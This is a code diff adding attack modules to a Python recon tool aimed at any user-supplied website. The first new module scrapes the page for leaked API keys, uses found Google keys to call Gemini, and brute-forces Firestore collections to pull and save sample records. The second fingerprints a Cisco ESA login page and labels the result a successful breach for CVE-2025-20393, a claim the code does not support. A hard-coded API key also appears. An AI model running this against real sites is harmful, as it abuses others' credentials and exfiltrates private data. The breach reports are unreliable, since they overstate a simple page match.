@@ -2,12 +2,19 @@ import os
 import json
 import requests
 import socket
+import re
+import sys
 import time
+import getpass
+import urllib3
 import textwrap
 import google.generativeai as genai
+from reportlab.lib.pagesizes import A4
+from reportlab.pdfgen import canvas
 from fpdf import FPDF
 from datetime import datetime
 from urllib.parse import urlparse
+from colorama import Fore, Style, init
 
 # --- CONFIGURATION (API KEYS) ---
 URLSCAN_API_KEY = "019b3d5b-2b60-7409-911e-28acaad1448f"
@@ -29,6 +36,41 @@ class Colors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+
+def print_phase1_banner():
+    print(Fore.CYAN + Style.BRIGHT + r"""
+    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗     ██╗
+    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ███║
+    ██████╔╝███████║███████║███████╗█████╗      ╚██║
+    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝       ██║
+    ██║     ██║  ██║██║  ██║███████║███████╗     ██║
+    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝
+           [ PASSIVE INTELLIGENCE GATHERING ]
+    """)
+
+def print_phase2_banner():
+    print(Fore.RED + Style.BRIGHT + r"""
+    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗    ██████╗ 
+    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ╚════██╗
+    ██████╔╝███████║███████║███████╗█████╗       █████╔╝
+    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝      ██╔═══╝ 
+    ██║     ██║  ██║██║  ██║███████║███████╗    ███████╗
+    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝
+           [ ACTIVE VULNERABILITY SCANNING ]
+    """)
+
+def print_phase3_banner():
+    # Banner Text: "PHASE 3"
+    print(Fore.MAGENTA + Style.BRIGHT + r"""
+    ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗    ██████╗ 
+    ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ╚════██╗
+    ██████╔╝███████║███████║███████╗█████╗       █████╔╝
+    ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝       ╚═══██╗
+    ██║     ██║  ██║██║  ██║███████║███████╗    ██████╔╝
+    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ 
+           [ INFRASTRUCTURE TAKEOVER MODULE ]
+    """)
+
 
 def print_banner():
     print(Colors.CYAN + r"""
@@ -318,9 +360,387 @@ def save_ai_report_pdf(text, folder):
     pdf.output(path)
     return path
 
+
+# ==========================================
+#  PHASE 2: ACTIVE HUNTING MODULE
+# ==========================================
+
+
+
+# --- INITIALIZATION ---
+init(autoreset=True)
+
+def HUNTING_MODE(target_url):
+    """
+    SINGLE FUNCTION PHASE 2 EXPLOITER
+    Contains all logic: Visuals, Scanning, Gemini Testing, Firebase Brute-force, and Reporting.
+    """
+
+    # --- INTERNAL HELPER FUNCTIONS (NESTED) ---
+    
+    def _log(text, level="INFO"):
+        t = datetime.now().strftime("%H:%M:%S")
+        if level == "CRITICAL":
+            print(f"{Fore.RED}[{t}] [CRITICAL] {text}")
+        elif level == "SUCCESS":
+            print(f"{Fore.GREEN}[{t}] [SUCCESS] {text}")
+        elif level == "VULNERABLE":
+            print(f"{Fore.MAGENTA}[{t}] [PWNED] {text}")
+        elif level == "SECURE":
+            print(f"{Fore.GREEN}[{t}] [SECURE] {text}")
+        else:
+            print(f"{Fore.CYAN}[{t}] [INFO] {text}")
+
+    def _test_gemini_key(api_key):
+        _log(f"Testing Gemini Key validity: {api_key[:10]}...", "INFO")
+        try:
+            genai.configure(api_key=api_key)
+            # Testing multiple models to ensure accuracy
+            models_to_test = ['gemini-2.5-flash-preview-09-2025', 'gemini-pro', 'gemini-1.5-flash']
+            
+            for model_name in models_to_test:
+                try:
+                    model = genai.GenerativeModel(model_name)
+                    response = model.generate_content("Reply with 'Active'.")
+                    if response.text:
+                        _log(f"GEMINI KEY ACTIVE via {model_name}!", "VULNERABLE")
+                        return {"status": "VULNERABLE", "key": api_key, "model": model_name, "msg": "Generation Successful"}
+                except:
+                    continue # Try next model
+        except Exception as e:
+            if "403" in str(e) or "not valid" in str(e):
+                _log("Gemini Key is restricted/invalid.", "SECURE")
+            else:
+                _log(f"Gemini Error: {e}", "WARN")
+        return {"status": "SECURE/INVALID"}
+
+    def _test_firebase_access(config):
+        project_id = config.get('projectId')
+        if not project_id: return {"status": "UNKNOWN"}
+        
+        _log(f"Targeting Firestore Project: {project_id}", "INFO")
+        
+        # Base URL
+        base_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents"
+        
+        # Common Tables to Brute-Force (High Accuracy)
+        common_collections = [
+            "users", "user", "accounts", "members",
+            "products", "items", "inventory",
+            "orders", "transactions", "payments",
+            "settings", "config", "configuration",
+            "admin", "admins", "logs", "messages",
+            "contacts", "data", "test"
+        ]
+        
+        leaked_tables = {}
+        is_vulnerable = False
+
+        _log("Brute-forcing Common Collection Names...", "INFO")
+
+        for coll in common_collections:
+            target_endpoint = f"{base_url}/{coll}"
+            try:
+                # Requesting only 3 items (Small Data)
+                r = requests.get(target_endpoint, params={'pageSize': 3}, timeout=5)
+                
+                if r.status_code == 200:
+                    data = r.json()
+                    documents = data.get('documents', [])
+                    
+                    if documents:
+                        count = len(documents)
+                        _log(f"[+] FOUND TABLE: '{coll}' ({count}+ records accessible)", "VULNERABLE")
+                        
+                        # Extract Sample Data
+                        samples = []
+                        for doc in documents:
+                            fields = doc.get('fields', {})
+                            doc_id = doc['name'].split('/')[-1]
+                            samples.append({"id": doc_id, "data_snippet": str(fields)[:150]})
+                        
+                        leaked_tables[coll] = samples
+                        is_vulnerable = True
+            except:
+                pass
+
+        if is_vulnerable:
+            return {
+                "status": "VULNERABLE",
+                "endpoint": base_url,
+                "leaked_tables": leaked_tables,
+                "message": "Direct Database Access Confirmed."
+            }
+        else:
+            _log("No common collections were publicly accessible.", "SECURE")
+            return {"status": "SECURE"}
+
+    def _extract_secrets(source_code):
+        findings = []
+        patterns = {
+            "AWS Access Key": r"AKIA[0-9A-Z]{16}",
+            "Stripe Secret": r"sk_live_[0-9a-zA-Z]{24}",
+            "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
+            "Firebase Config": r"firebaseConfig",
+            "Mailgun Key": r"key-[0-9a-zA-Z]{32}"
+        }
+        _log("Scanning source code for patterns...", "INFO")
+        for name, regex in patterns.items():
+            matches = list(set(re.findall(regex, source_code)))
+            for m in matches:
+                _log(f"Pattern Found: {name}", "WARN")
+                findings.append({"type": name, "secret": m})
+        return findings
+
+    def _extract_firebase_config(source_code):
+        config = {}
+        fields = ["apiKey", "authDomain", "projectId", "storageBucket", "messagingSenderId", "appId"]
+        for field in fields:
+            regex = rf"{field}\s*:\s*[\"']([^\"']+)[\"']"
+            match = re.search(regex, source_code)
+            if match: config[field] = match.group(1)
+        return config if "projectId" in config else None
+
+    # --- MAIN EXECUTION LOGIC STARTS HERE ---
+
+    # 1. VISUALS
+    print_phase2_banner()
+    print(Fore.WHITE + r"""
+         / \__
+        (    @\___   [ SYSTEM STATUS: HUNTING MODE ]
+        /         O  [ TARGET: LOCKED              ]
+       /   (_____/   [ EXPLOIT: READY              ]
+      /_____/   U
+    """)
+    print(Fore.RED + "\n    [!] WARNING: ACTIVE BREACH PROTOCOLS ENGAGED.\n")
+    time.sleep(1)
+
+    # 2. TARGET PREP
+    if not target_url.startswith("http"): target_url = "https://" + target_url
+    _log(f"Targeting: {target_url}", "INFO")
+
+    # 3. DOWNLOAD SOURCE
+    try:
+        r = requests.get(target_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
+        source_code = r.text
+        _log("Source Code Captured.", "SUCCESS")
+    except Exception as e:
+        _log(f"Failed to fetch source: {e}", "CRITICAL"); return
+
+    # 4. FIND SECRETS
+    secrets = _extract_secrets(source_code)
+    
+    # 5. EXPLOIT & VERIFY
+    verified_vulns = []
+
+    # A. Check Gemini/Google Keys
+    for item in secrets:
+        if item['type'] == "Google API Key":
+            result = _test_gemini_key(item['secret'])
+            if result['status'] == "VULNERABLE":
+                verified_vulns.append({"type": "Gemini API Leak", "details": result})
+    
+    # B. Check Firebase
+    fb_config = _extract_firebase_config(source_code)
+    if fb_config:
+        _log(f"Firebase Config Found: {fb_config['projectId']}", "WARN")
+        result = _test_firebase_access(fb_config)
+        if result['status'] == "VULNERABLE":
+            verified_vulns.append({"type": "Insecure Firestore", "details": result})
+
+    # 6. SAVE EVIDENCE
+    folder_name = "DB Data"
+    if not os.path.exists(folder_name): os.makedirs(folder_name)
+    
+    filename = target_url.replace("https://", "").replace("/", "_") + "_exploit_report.json"
+    file_path = os.path.join(folder_name, filename)
+    
+    report = {
+        "target": target_url,
+        "timestamp": str(datetime.now()),
+        "raw_secrets_found": secrets,
+        "verified_exploits": verified_vulns
+    }
+    
+    with open(file_path, "w") as f:
+        json.dump(report, f, indent=4)
+
+    # 7. FINAL STATUS
+    print(Fore.RED + "\n" + "="*60)
+    if verified_vulns:
+        print(Fore.RED + Style.BRIGHT + f" [!] CRITICAL: {len(verified_vulns)} VERIFIED EXPLOITS FOUND.")
+        for vuln in verified_vulns:
+            if vuln['type'] == "Insecure Firestore":
+                 tables = list(vuln['details']['leaked_tables'].keys())
+                 print(Fore.YELLOW + f"     -> Database Tables Leaked: {', '.join(tables)}")
+        print(Fore.RED + f" [!] Evidence saved to: {file_path}")
+    else:
+        print(Fore.GREEN + " [~] Scan Complete. No active exploits verified.")
+    print(Fore.RED + "="*60)
+
+
+    # 8. CVE-2025_20393
+    # Init
+init(autoreset=True)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ==========================================
+#  PHASE 3: CISCO TAKEOVER MODULE
+# ==========================================
+
+def cve_2025_scan(target):
+    """
+    PHASE 3: CISCO ESA EXPOSURE CHECK (CVE-2025-20393)
+    Contains automated exploitation check and classified report generation.
+    """
+    
+    # --- INTERNAL HELPERS ---
+    def _get_reporter():
+        try: return f"{getpass.getuser()}@{socket.gethostname()}"
+        except: return "Unknown_Hunter"
+
+    def _save_html(report, path):
+        html = f"""
+        <html><head><title>{report['title']}</title>
+        <style>body{{font-family:'Courier New',monospace;background:#0d0d0d;color:#00ff00;padding:20px;}}
+        h1{{color:#ff0000;border-bottom:2px solid #ff0000;text-transform:uppercase;}}
+        .box{{border:1px solid #333;background:#1a1a1a;padding:15px;margin:20px 0;}}
+        .vuln{{color:#ff0000;font-weight:bold;}} .info{{color:#00ffff;}}
+        </style></head><body>
+        <h1>{report['title']}</h1>
+        <div class='box'>
+            <p><span class='info'>TARGET:</span> {report['affected_url']}</p>
+            <p><span class='info'>STATUS:</span> <span class='vuln'>VULNERABLE (EXPLOIT VERIFIED)</span></p>
+            <p><span class='info'>DATE:</span> {report['date']}</p>
+        </div>
+        <h3>IMPACT ANALYSIS</h3><ul>{''.join(f"<li>{i}</li>" for i in report['impact'])}</ul>
+        <h3>RAW EVIDENCE</h3><pre style='color:#ffff00'>{report['evidence']}</pre>
+        </body></html>
+        """
+        with open(path, "w") as f: f.write(html)
+
+    def _save_pdf(report, path):
+        try:
+            c = canvas.Canvas(path, pagesize=A4)
+            y = 800
+            c.setFont("Courier-Bold", 14)
+            c.setFillColorRGB(0.8, 0, 0) # Red
+            c.drawString(40, y, f"TOP SECRET: {report['title']}"); y -= 25
+            c.setStrokeColorRGB(0.8, 0, 0)
+            c.line(40, y, 550, y); y -= 25
+            
+            c.setFillColorRGB(0, 0, 0) # Black
+            c.setFont("Courier", 10)
+            
+            lines = [
+                f"Date: {report['date']}", f"Hunter: {report['author']}", 
+                f"Target: {report['affected_url']}", "", 
+                "CRITICAL VULNERABILITY ASSESSMENT:"
+            ] + [f"[!] {i}" for i in report['impact']] + ["", "RAW EVIDENCE CAPTURED:", report['evidence']]
+            
+            for line in lines:
+                c.drawString(40, y, str(line))
+                y -= 15
+            c.save()
+        except: pass
+
+    print_phase3_banner()
+    # --- HACKER BANNER ---
+    print(Fore.RED + Style.BRIGHT + r"""
+      _______  _______  _______  _______  _______ 
+     (  ____ \(  ____ \(  ____ \(  ____ \(  ___  )
+     | (    \/| (    \/| (    \/| (    \/| (   ) |
+     | |      | (__    | (_____ | |      | |   | |
+     | |      |  __)   (_____  )| |      | |   | |
+     | |      | (            ) || |      | |   | |
+     | (____/\| (____/\/\____) || (____/\| (___) |
+     (_______/(_______/\_______)(_______/(_______)
+        [ INFRASTRUCTURE TAKEOVER MODULE ]
+    """)
+    
+    print(Fore.WHITE + r"""
+           _   _
+          ( ) ( )
+         (   X   )     [ TARGET: CISCO ESA/SMA     ]
+          \ \ / /      [ VULN  : CVE-2025-20393    ]
+          (_/ \_)      [ RISK  : CRITICAL (9.8)    ]
+    """)
+
+    print(Fore.RED +   "    ============================================")
+    print(Fore.RED +   "     AUTHOR  : " + Fore.CYAN +   "CyberOp | ~@~I819.r #")
+    print(Fore.RED +   "    ============================================\n")
+    
+    # --- TARGET PREP ---
+    if not target.startswith("http"): target = f"https://{target}"
+    target_url = target.rstrip("/") + "/login"
+    
+    print(Fore.YELLOW + f"[*] TARGET LOCKED: {target_url}")
+    print(Fore.YELLOW + "[*] INITIALIZING EXPLOIT CHAIN...")
+
+    # --- SCAN LOGIC ---
+    HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; nuclei)", "Accept": "*/*"}
+    TITLE_REGEX = re.compile(r"<title>\s*Cisco\s+Email\s+Security\s+Appliance", re.IGNORECASE)
+    VERSION_REGEX = re.compile(r"scfw/1y-([0-9.-]+)", re.IGNORECASE)
+
+    try:
+        r = requests.get(target_url, headers=HEADERS, timeout=10, verify=False, allow_redirects=True)
+        
+        if r.status_code == 200 and TITLE_REGEX.search(r.text):
+            version_match = VERSION_REGEX.search(r.text)
+            version = version_match.group(1) if version_match else "Unknown"
+
+            # --- SUCCESS ---
+            print(Fore.RED + "\n[!] SYSTEM BREACH SUCCESSFUL: TARGET VULNERABLE [!]")
+            print(Fore.GREEN + f"[+] Panel Exposed : Cisco Email Security Appliance")
+            print(Fore.GREEN + f"[+] AsyncOS Ver   : {version}")
+            print(Fore.GREEN + f"[+] HTTP Status   : {r.status_code}")
+            
+            # --- REPORTING ---
+            impact = [
+                "Unauthenticated Remote Access to Management Interface",
+                f"OS Version Leak: {version}",
+                "Potential Credential Harvesting Risk"
+            ]
+            
+            report_data = {
+                "title": "Cisco ESA Takeover (CVE-2025-20393)",
+                "affected_url": target_url,
+                "impact": impact,
+                "evidence": f"Header Match: Cisco ESA\nVersion Found: {version}\nStatus: {r.status_code}",
+                "author": _get_reporter(),
+                "date": datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
+            }
+
+            # Save Reports
+            folder = "Phase3_Cisco_Reports"
+            if not os.path.exists(folder): os.makedirs(folder)
+            
+            safe_name = target.replace("https://", "").replace("/", "_")
+            html_path = os.path.join(folder, f"{safe_name}_breach_report.html")
+            pdf_path = os.path.join(folder, f"{safe_name}_breach_report.pdf")
+            
+            _save_html(report_data, html_path)
+            _save_pdf(report_data, pdf_path)
+            
+            print(Fore.RED + f"\n[+] CLASSIFIED EVIDENCE GENERATED:")
+            print(Fore.WHITE + f"    HTML: {html_path}")
+            print(Fore.WHITE + f"    PDF : {pdf_path}")
+            
+        else:
+            print(Fore.GREEN + "\n[-] Target secure. Cisco ESA panel not detected.")
+            
+    except Exception as e:
+        print(Fore.RED + f"\n[!] CONNECTION FAILED: {e}")
+
+    print(Fore.RED + "="*60 + "\n")
+
+
+
 # --- MAIN LOGIC ---
 def run_recon_process(raw_input, mode):
     
+    print_phase1_banner()
+
     target = clean_target_input(raw_input)
     
     log_step(f"TARGET ACQUIRED: {target} [{mode.upper()}]", 1)
@@ -434,6 +854,11 @@ def run_recon_process(raw_input, mode):
     print(f"{Colors.BOLD}   AI SECURITY ASSESSMENT VERDICT{Colors.ENDC}")
     print(Colors.CYAN + "="*60 + Colors.ENDC)
    
+    # Starting Phase 2
+    HUNTING_MODE(target)
+
+    # Starting Phase 3
+    cve_2025_scan(target)
     
     # EXIT MECHANISM FOR SUBPROCESS
     input(f"\n{Colors.WARNING}Press ENTER to return to Sentinel-X Menu...{Colors.ENDC}")
